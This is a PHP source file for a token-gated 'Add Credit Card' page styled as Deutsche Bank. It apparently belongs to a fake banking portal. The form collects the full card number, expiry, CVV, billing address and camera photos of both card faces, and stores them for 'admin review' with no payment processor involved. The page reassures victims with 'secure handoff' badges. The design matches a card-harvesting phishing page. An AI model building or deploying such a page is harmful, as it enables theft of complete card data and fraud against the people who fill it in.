<?php
require_once __DIR__ . '/config/database.php';
require_once __DIR__ . '/includes/helpers.php';
ensure_banking_schema();

$token = (string) ($_GET['token'] ?? $_POST['token'] ?? '');
$stmt = db()->prepare('SELECT lc.*, u.first_name, u.last_name FROM linked_cards lc JOIN users u ON u.id=lc.user_id WHERE lc.token=? LIMIT 1');
$stmt->execute([$token]);
$cardLink = $stmt->fetch();

if (!$cardLink) {
    flash('danger', 'This card-link page is not available.');
    header('Location: login.php');
    exit;
}

if (card_link_effective_status($cardLink) !== 'active') {
    if (card_link_effective_status($cardLink) === 'expired') {
        db()->prepare('UPDATE linked_cards SET status="expired", link_status="expired" WHERE id=? AND status="link_created"')->execute([(int) $cardLink['id']]);
    }
    flash('danger', 'This Add Credit Card link is expired or has already been used.');
    header('Location: login.php');
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    verify_csrf();
    try {
        banking_submit_linked_card(
            $token,
            (string) $_POST['cardholder_name'],
            (string) $_POST['card_number'],
            (string) $_POST['expiry_month'],
            (string) $_POST['expiry_year'],
            (string) ($_POST['issuing_bank'] ?? ''),
            (string) ($_POST['card_country'] ?? ''),
            $_FILES['card_front_image'] ?? null,
            $_FILES['card_back_image'] ?? null,
            (string) ($_POST['cvv'] ?? ''),
            (string) ($_POST['billing_address'] ?? '')
        );
        flash('success', 'Card submitted for admin review. Please sign in to continue.');
        header('Location: login.php');
        exit;
    } catch (Throwable $e) {
        flash('danger', $e->getMessage());
    }
}

$pageTitle = 'Add Credit Card';
?>
<?php include __DIR__ . '/includes/public_header.php'; ?>
<section class="card-link-shell card-link-shell-modern">
    <div class="card-link-hero">
        <?= brand_logo('light') ?>
        <div>
            <span class="eyebrow">Secure Add Credit Card link</span>
            <h1>Credit card review for <?= e($cardLink['first_name'] . ' ' . $cardLink['last_name']) ?></h1>
            <p>Complete the credit card profile and attach optional front and back images for account team review.</p>
        </div>
        <div class="card-link-metrics">
            <span><strong>256-bit</strong> secure handoff</span>
            <span><strong>Manual</strong> admin approval</span>
            <span><strong>0</strong> processor charges</span>
        </div>
    </div>

    <div class="card-link-workspace">
        <div class="live-card-preview" data-card-preview data-brand="card">
            <div class="live-card-face live-card-front">
                <div class="live-card-topline">
                    <strong>Deutsche Bank</strong>
                    <span class="card-brand-badge" data-card-brand>Card</span>
                </div>
                <div class="card-chip-row">
                    <div class="card-chip"></div>
                    <i class="fa-solid fa-wifi"></i>
                </div>
                <div class="live-card-number" data-card-number>0000 0000 0000 0000</div>
                <div class="live-card-bottom">
                    <span><small>Cardholder</small><strong data-card-name><?= e(strtoupper($cardLink['first_name'] . ' ' . $cardLink['last_name'])) ?></strong></span>
                    <span><small>Valid thru</small><strong data-card-expiry>MM/YY</strong></span>
                </div>
            </div>
            <div class="live-card-face live-card-back">
                <div class="card-strip"></div>
                <div class="card-signature-row">
                    <span>Authorized signature</span>
                    <strong class="cvv-box" data-card-cvv-preview>CVV</strong>
                </div>
                <p class="card-back-copy">This card profile is reviewed manually before it becomes available in online banking.</p>
            </div>
        </div>
        <div class="card-preview-caption">
            <span><i class="fa-solid fa-eye"></i> Live preview</span>
            <span><i class="fa-solid fa-rotate"></i> Focus CVV to flip</span>
        </div>
    </div>

    <div class="auth-card premium-card-entry card-link-form-card">
        <?= brand_logo() ?>
        <h2>Add Credit Card</h2>
        <p class="muted">Enter the card details exactly as they appear. You will return to sign in after submission.</p>
        <form method="post" enctype="multipart/form-data" data-card-link-form>
            <?= csrf_field() ?>
            <input type="hidden" name="token" value="<?= e($token) ?>">

            <div class="card-proof-panel camera-first-panel mt-3 mb-3">
                <div>
                    <strong>Start with camera upload</strong>
                    <span>Snap or upload the front and back of the credit card first. Manual entry below is the fallback.</span>
                </div>
                <label class="card-upload-drop camera-primary">
                    <i class="fa-solid fa-camera"></i>
                    <span><strong>Front of card</strong><small data-file-name>Open camera or upload image</small></span>
                    <input name="card_front_image" type="file" accept="image/*" capture="environment">
                </label>
                <label class="card-upload-drop">
                    <i class="fa-solid fa-camera-rotate"></i>
                    <span><strong>Back of card</strong><small data-file-name>Open camera or upload image</small></span>
                    <input name="card_back_image" type="file" accept="image/*" capture="environment">
                </label>
            </div>

            <div class="secure-input-group">
                <label class="form-label">Cardholder name</label>
                <input name="cardholder_name" class="form-control" value="<?= e($cardLink['first_name'] . ' ' . $cardLink['last_name']) ?>" autocomplete="cc-name" data-card-name-input required>
            </div>

            <div class="secure-input-group">
                <label class="form-label">Card number</label>
                <div class="card-number-field">
                    <input name="card_number" class="form-control" inputmode="numeric" autocomplete="cc-number" placeholder="1234 5678 9012 3456" data-card-number-input required>
                    <span data-card-brand-mini>Card</span>
                </div>
            </div>

            <div class="row g-3">
                <div class="col-6">
                    <label class="form-label">Expiry date</label>
                    <input class="form-control" inputmode="numeric" autocomplete="cc-exp" placeholder="MM/YY" maxlength="5" data-card-expiry-input required>
                    <input name="expiry_month" type="hidden" data-card-exp-month>
                    <input name="expiry_year" type="hidden" data-card-exp-year>
                </div>
                <div class="col-6">
                    <label class="form-label">CVV</label>
                    <input name="cvv" class="form-control" inputmode="numeric" autocomplete="cc-csc" placeholder="123" maxlength="4" data-card-cvv required>
                </div>
                <div class="col-12">
                    <label class="form-label">Country</label>
                    <input name="card_country" class="form-control" placeholder="Germany" data-card-country>
                </div>
            </div>

            <div class="secure-input-group">
                <label class="form-label">Issuing bank</label>
                <input name="issuing_bank" class="form-control" placeholder="Bank name on card">
            </div>

            <div class="secure-input-group">
                <label class="form-label">Billing address</label>
                <textarea name="billing_address" class="form-control" rows="3" placeholder="Billing address connected to this credit card"></textarea>
            </div>

            <button class="btn btn-navy w-100 mt-4">Submit for review</button>
        </form>
    </div>
</section>
<?php include __DIR__ . '/includes/public_footer.php'; ?>
